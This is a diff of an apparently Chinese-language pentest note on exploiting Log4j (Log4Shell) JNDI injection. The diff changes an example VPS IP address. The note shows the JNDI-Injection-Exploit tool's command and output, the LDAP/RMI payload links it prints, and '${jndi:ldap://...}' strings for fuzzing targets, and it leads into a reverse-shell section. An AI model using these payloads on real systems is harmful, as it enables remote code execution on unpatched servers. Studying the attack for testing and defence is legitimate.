@@ -5,19 +5,19 @@ vps IP 假设为 10.10.10.10
 `java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "calc.exe" -A 10.10.10.10`
 ```
 [root@VM_0_16_centos ~]# java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ping xx.24b5010c.dns.1433.eu.org" -A 10.10.10.10
-[ADDRESS] >> 10.10.10.109
+[ADDRESS] >> 10.10.10.10
 [COMMAND] >> ping xx.24b5010c.dns.1433.eu.org
 ----------------------------JNDI Links---------------------------- 
 Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
-rmi://10.10.10.109:1099/1ovanh
+rmi://10.10.10.10:1099/1ovanh
 Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
-rmi://10.10.10.109:1099/kavkt9
-ldap://10.10.10.109:1389/kavkt9
+rmi://10.10.10.10:1099/kavkt9
+ldap://10.10.10.10:1389/kavkt9
 Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
-rmi://10.10.10.109:1099/m5m8wo
-ldap://10.10.10.109:1389/m5m8wo
+rmi://10.10.10.10:1099/m5m8wo
+ldap://10.10.10.10:1389/m5m8wo
 ```
-然后fuzz `${jndi:ldap://10.10.10.10:1389/kavkt9}` 或者 `${jndi:ldap://10.10.10.109:1389/m5m8wo} `
+然后fuzz `${jndi:ldap://10.10.10.10:1389/kavkt9}` 或者 `${jndi:ldap://10.10.10.10:1389/m5m8wo} `
 ![](img/2.png)
 
 ## 2、反弹shell
